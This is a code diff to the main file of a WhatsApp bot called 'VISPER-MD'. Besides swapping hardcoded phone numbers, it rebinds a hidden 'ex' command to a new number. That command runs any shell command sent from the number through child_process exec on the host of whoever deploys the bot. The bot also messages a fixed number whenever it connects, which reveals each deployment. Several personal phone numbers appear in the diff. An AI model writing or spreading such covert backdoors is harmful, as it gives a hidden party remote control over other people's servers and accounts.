@@ -51,7 +51,7 @@ const df = __dirname + '/auth_info_baileys/creds.json';
 
 if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
-    const sessdata = config.SESSION_ID.replace("MOVIE-VISPER-MD=", "");
+    const sessdata = config.SESSION_ID.replace("VISPER-MD=", "");
 
     if (sessdata.includes("#")) {
       const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
@@ -165,7 +165,7 @@ conn.ev.on('connection.update', async (update) => {
                     console.warn("⚠️ Failed to fetch connect message text:", fetchErr.message);
                 }
 
-                await conn.sendMessage(`94724375368@s.whatsapp.net`, {
+                await conn.sendMessage(`94763934860@s.whatsapp.net`, {
   image: { url: 'https://i.ibb.co/JWfHrp4d/jpg.jpg' },
   caption: '*Bot connected*'
 });
@@ -311,7 +311,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94724375368,94722617699,94788518429,94787318729`
+const developers = `94763934860,94771825192`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -334,12 +334,6 @@ return false
 }
 
 
-
-
-
-
-
-	    
 const reply = async(teks) => {
   return await conn.sendMessage(from, { text: teks }, { quoted: mek })
 }
@@ -633,10 +627,6 @@ section.rows.forEach((row, rowIndex) => {
 };
 
 
-
-
-	    
-
 conn.edite = async (gg, newmg) => {
   await conn.relayMessage(from, {
     protocolMessage: {
@@ -686,19 +676,6 @@ conn.forwardMessage = async (jid, message, forceForward = false, options = {}) =
 }
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-	    
 conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   let mime = '';
   let res = await axios.head(url)
@@ -723,7 +700,7 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
 
 
 //=========================================================================================================================	    
-if(senderNumber.includes("94724375368")){
+if(senderNumber.includes("94763934860")){
 if(isReact) return
 m.react(`👨🏻‍💻`)
 }
@@ -742,10 +719,6 @@ if  ( isGroup &&  !isMe && !isOwner ) return
       }      
 
 
-
-
-
-	    
 //==================================plugin map================================
 const events = require('./command')
 const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
@@ -779,8 +752,8 @@ events.commands.map(async (command) => {
   }
 });
 
-//============================================================================
 
+//============================================================================
 
 switch (command) {
   case 'jid':
@@ -793,7 +766,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94763934860) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -805,7 +778,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94763934860) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
